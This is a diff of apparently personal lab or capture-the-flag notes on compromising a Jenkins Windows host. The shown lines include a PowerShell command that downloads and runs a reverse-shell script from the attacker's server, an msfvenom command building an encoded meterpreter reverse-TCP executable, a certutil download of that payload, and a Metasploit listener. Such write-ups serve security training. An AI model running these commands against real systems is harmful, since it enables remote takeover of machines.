@@ -68,6 +68,7 @@ Find a feature of the tool that allows you to execute commands on the underlying
 
 You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: python3 -m http.server
 ### Finding the feature that allows for code execution
+
 1. Navigate to the following: http://10.10.206.196:8080/job/project/configure
 ![[Pasted image 20251013215624.png]]
 
@@ -91,7 +92,8 @@ powershell iex (New-Object  Net.WebClient).DownloadString('http://your-ip:your-p
 ```
 
 replace http://your-ip:your-port/Invoke-PowerShellTcp.ps1 with the address obtained from your updog webserver
-```
+
+```powershell
 powershell iex (New-Object  Net.WebClient).DownloadString('http://10.9.0.78:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress 10.9.0.78 -Port 4444
 ```
 
@@ -121,7 +123,7 @@ Time to upgrade our shells from a simple netcat shell to a meterpreter shell
 ## Generate the MSFVenom Payload
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.78 LPORT=9090 -f exe -o shell_main.exe
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.78 LPORT=9090 -f exe -o SHELL.exe
 ```
 ## Download the payload on the webserver 
 1. We already have our python server running
@@ -133,6 +135,16 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.75:800
 
 ![[Pasted image 20251013221421.png]]
 
+The above method was giving issues, so i tried using: Certutil
+```
+certutil -urlcache -f http://10.9.0.78:8000/SHELL.exe SHELL.exe
+```
+
+![[Pasted image 20251013224956.png]]
+
+Certutil seems to have worked~~
+
+---
 ## Setup a Meterpreter Listener 
 ```
 msfconsole -q -x "use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.9.0.78 set 9090 listening-port run"
